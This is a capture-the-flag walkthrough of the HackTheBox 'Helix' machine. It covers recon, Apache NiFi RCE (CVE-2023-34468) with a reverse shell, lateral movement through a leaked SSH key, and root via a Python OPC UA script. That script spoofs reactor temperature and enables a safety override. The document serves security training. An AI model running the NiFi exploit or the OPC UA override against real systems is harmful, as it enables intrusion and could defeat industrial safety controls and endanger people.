# Helix — HackTheBox Writeup
**Difficulty:** Medium  
**OS:** Linux  
**IP:** `10.129.xx.xx`

---

## Table of Contents
1. [Reconnaissance](#1-reconnaissance)
2. [Virtual Host Enumeration](#2-virtual-host-enumeration)
3. [CVE-2023-34468 — Apache NiFi RCE](#3-cve-2023-34468--apache-nifi-rce)
4. [Initial Foothold — Shell as `nifi`](#4-initial-foothold--shell-as-nifi)
5. [Lateral Movement — `operator` via SSH Key](#5-lateral-movement--operator-via-ssh-key)
6. [User Flag](#6-user-flag)
7. [Privilege Escalation — Abusing OPC UA & Maintenance Console](#7-privilege-escalation--abusing-opc-ua--maintenance-console)
   - [Enumerating Internal Services](#71-enumerating-internal-services)
   - [Reactor HMI — Understanding the Logic](#72-reactor-hmi--understanding-the-logic)
   - [SSH Port Forwarding for OPC UA](#73-ssh-port-forwarding-for-opc-ua)
   - [OPC UA Exploit — Simulating Hazardous Conditions](#74-opc-ua-exploit--simulating-hazardous-conditions)
   - [Triggering the Maintenance Console](#75-triggering-the-maintenance-console)
8. [Root Flag](#8-root-flag)
9. [Step-by-Step Summary](#9-step-by-step-summary)

---

## 1. Reconnaissance

Starting with an Nmap version/script scan against the target:

```bash
nmap -sV -sC 10.129.xx.xx
```

**Results:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://helix.htb/
```

Two ports open: **SSH (22)** and **HTTP (80)**. The HTTP server redirects to `helix.htb`, so we add it to `/etc/hosts`:

```
10.129.xx.xx  helix.htb
```

---

## 2. Virtual Host Enumeration

Fuzzing for additional virtual hosts using `ffuf`:

```bash
ffuf -u http://helix.htb/ -H "Host: FUZZ.helix.htb" \
  -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
  -fc 301 -fw 4
```

**Result:**

```
flow  [Status: 200, Size: 1068, Words: 110, Lines: 28, Duration: 848ms]
```

A subdomain `flow.helix.htb` is discovered. Add it to `/etc/hosts`:

```
10.129.xx.xx  helix.htb flow.helix.htb
```

Navigating to `http://flow.helix.htb` reveals an **Apache NiFi v1.21.0** instance.

---

## 3. CVE-2023-34468 — Apache NiFi RCE

**Vulnerability:** CVE-2023-34468  
**Affected versions:** Apache NiFi 0.0.2 through 1.21.0

The `DBCPConnectionPool` and `HikariCPConnectionPool` Controller Services allow an authenticated user to configure a Database URL using the H2 driver, which enables **arbitrary code execution**.

Crucially, the NiFi instance accepts **anonymous access** with write permissions, making authentication a non-issue.

**PoC used:** [https://github.com/sbouabid-sec/CVE-2023-34468-POC](https://github.com/sbouabid-sec/CVE-2023-34468-POC)

---

## 4. Initial Foothold — Shell as `nifi`

Set up a listener and run the exploit:

```bash
nc -nlvp 4444
```

```bash
python3 exploit.py
```

**Exploit output:**

```
[*] Target: http://flow.helix.htb | LHOST: 10.10.xx.xx:4444 | HTTP: 80
[+] Identity: anonymous | Anonymous: True | canWrite: True
[+] Target is exploitable
[*] Getting root process group ID...
[+] PG ID: f203bc07-019b-1000-516b-eaedd48609d1
[*] Creating DBCPConnectionPool...
[+] CS ID: 205a2d23-019e-1000-6b83-612ec390982c
[*] Enabling controller service...
[+] Controller service enabled
[*] Creating ExecuteSQL processor...
[+] Processor ID: 205a3b51-019e-1000-1469-9bf905aa302d
[*] Starting processor...
[+] Processor running — waiting for shell on port 4444...
[+] rce.sql delivered to target
```

A reverse shell connects back:

```bash
connect to [10.10.xx.xx] from (UNKNOWN) [10.129.xx.xx] 47320
nifi@helix:/opt/nifi-1.21.0$ id
uid=998(nifi) gid=998(nifi) groups=998(nifi)
```

We have a shell as the `nifi` service account.

---

## 5. Lateral Movement — `operator` via SSH Key

Exploring the NiFi directory, a backup SSH private key is found:

```bash
cat /opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak
```

```
-----BEGIN OPENSSH PRIVATE KEY-----
[REDACTED]
-----END OPENSSH PRIVATE KEY-----
```

The key comment reveals it belongs to `root@management`, but the filename suggests it's for the `operator` user. Save it locally and connect:

```bash
ssh -i id_ed25519 operator@10.129.xx.xx
```

SSH login succeeds:

```
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-164-generic x86_64)
operator@helix:~$
```

---

## 6. User Flag

```bash
operator@helix:~$ cat user.txt
[REDACTED]
```

---

## 7. Privilege Escalation — Abusing OPC UA & Maintenance Console

### 7.1 Enumerating Internal Services

Checking `sudo` permissions:

```bash
operator@helix:~$ sudo -l
```

```
User operator may run the following commands on helix:
    (root) NOPASSWD: /usr/local/sbin/helix-maint-console
```

Running it immediately returns:

```
Maintenance window CLOSED.
```

Next, enumerate internal listening services:

```bash
ss -tulnp
```

Notable ports:
| Port | Service |
|------|---------|
| `127.0.0.1:8081` | Reactor HMI (web panel) |
| `127.0.0.1:4840` | OPC UA server |
| `127.0.0.1:8080` | NiFi |

### 7.2 Reactor HMI — Understanding the Logic

Curling the internal HMI panel at `127.0.0.1:8081` reveals a **Reactor control dashboard** showing:

- **Temperature**, **Pressure**, **Mode**, **Safety status**
- A **Privileged Maintenance Window** — currently `CLOSED`

The page notes:

> *"This window is granted by the safety controller only when a hazardous test condition is detected (e.g., Temp ≥ 295°C or Pressure ≥ 73 bar) while still below trip."*

The conditions required to **open the maintenance window** are:
- Temperature **≥ 295°C**
- Pressure **≥ 73 bar**
- Mode set to **`MAINTENANCE`**

The reactor is communicating via **OPC UA** on `opc.tcp://127.0.0.1:4840/helix/` — a standard industrial control protocol.

### 7.3 SSH Port Forwarding for OPC UA

Tunnel the OPC UA port locally:

```bash
ssh -L 4840:127.0.0.1:4840 operator@10.129.xx.xx -i id_ed25519
```

### 7.4 OPC UA Exploit — Simulating Hazardous Conditions

Using the `opcua` Python library, write a script to manipulate reactor values directly via OPC UA:

```python
from opcua import Client
import time

url = "opc.tcp://127.0.0.1:4840/helix/"
client = Client(url)

try:
    client.connect()
    print("[+] Connected to OPC UA via tunnel")

    nodes = {}
    for parent_id in ["ns=2;i=2", "ns=2;i=11"]:
        for child in client.get_node(parent_id).get_children():
            nodes[child.get_browse_name().Name] = child

    nodes["Mode"].set_value("MAINTENANCE")
    nodes["TestOverride"].set_value(True)
    nodes["CalibrationOffset"].set_value(20.0)

    print("[+] Payload injected. Hazardous condition simulated!")
    time.sleep(5)

finally:
    client.disconnect()
```

**What this does:**
- Sets reactor **Mode** → `MAINTENANCE`
- Enables **TestOverride** → bypasses normal safety gating
- Increases **CalibrationOffset** by `+20.0°C` → pushes reported temperature from ~283°C to **303°C**, exceeding the 295°C threshold

Run it:

```bash
python3 exploit_root.py
```

```
[+] Connected to OPC UA via tunnel
[+] Payload injected. Hazardous condition simulated!
```

Verify via the HMI:

```
Temperature: 303.1 °C  (Raw: 283.1°C | CalibrationOffset: 20.0°C)
Mode: MAINTENANCE
Test Mode Active: YES
Privileged Maintenance Window: OPEN (~102s)
```

### 7.5 Triggering the Maintenance Console

With the window open, immediately run the sudo command:

```bash
operator@helix:~$ sudo /usr/local/sbin/helix-maint-console
```

```
[+] Privileged maintenance access granted
[!] Window expires in 67 seconds
[!] Session will be terminated automatically
root@helix:/home/operator# id
uid=0(root) gid=0(root) groups=0(root)
```

Root shell obtained.

---

## 8. Root Flag

```bash
root@helix:~# cat root.txt
[REDACTED]
```

---

## 9. Step-by-Step Summary

### Phase 1 — Reconnaissance
1. Run `nmap -sV -sC` against the target. Discover **SSH (22)** and **HTTP (80)**.
2. The HTTP server redirects to `helix.htb` — add it to `/etc/hosts`.

### Phase 2 — Subdomain Discovery
3. Use `ffuf` to fuzz virtual hosts with a `Host:` header.
4. Discover `flow.helix.htb` — add it to `/etc/hosts`.
5. Visiting `flow.helix.htb` reveals **Apache NiFi v1.21.0**.

### Phase 3 — Exploiting NiFi (CVE-2023-34468)
6. Identify that NiFi v1.21.0 is vulnerable to **CVE-2023-34468** — an authenticated RCE via H2 JDBC URL injection.
7. The instance allows **anonymous write access**, so no credentials are needed.
8. Use the public PoC exploit script with a listener on port 4444.
9. Receive a reverse shell as the `nifi` user.

### Phase 4 — Lateral Movement to `operator`
10. Browse NiFi's directory structure; find `support-bundles/operator_id_ed25519.bak`.
11. Copy the ED25519 private key to the attack machine.
12. SSH into the box as `operator` using the key.
13. Capture the **user flag** from `~/user.txt`.

### Phase 5 — Privilege Escalation to `root`
14. Run `sudo -l` — `operator` can run `/usr/local/sbin/helix-maint-console` as root with no password.
15. Running it returns `Maintenance window CLOSED` — a time-based condition must be met first.
16. Run `ss -tulnp` — identify an internal **OPC UA server** on `127.0.0.1:4840` and **Reactor HMI** on `127.0.0.1:8081`.
17. `curl 127.0.0.1:8081` reveals the Reactor HMI. The maintenance window opens when **Temperature ≥ 295°C** or **Pressure ≥ 73 bar** while mode is **MAINTENANCE**.
18. Use SSH local port forwarding to tunnel port **4840** to the attack machine.
19. Write a Python OPC UA client that sets `Mode=MAINTENANCE`, `TestOverride=True`, and `CalibrationOffset=20.0` — this artificially inflates the reported temperature past the threshold.
20. Run the OPC UA exploit script — the reactor enters a simulated hazardous test state.
21. Verify via `curl 127.0.0.1:8081` that the maintenance window is now **OPEN**.
22. Immediately run `sudo /usr/local/sbin/helix-maint-console` — the console grants a **root shell**.
23. Capture the **root flag** from `/root/root.txt`.

---

### Key Techniques Used

| Technique | Tool / Method |
|-----------|--------------|
| Port scanning | `nmap` |
| Virtual host fuzzing | `ffuf` |
| Apache NiFi RCE | CVE-2023-34468 PoC |
| Credential discovery | File system enumeration |
| SSH lateral movement | Leaked ED25519 private key |
| Internal service enumeration | `ss -tulnp`, `curl` |
| OPC UA manipulation | Python `opcua` library |
| SSH tunneling | Local port forwarding (`-L`) |
| Privilege escalation | Sudo + time-gated maintenance console |
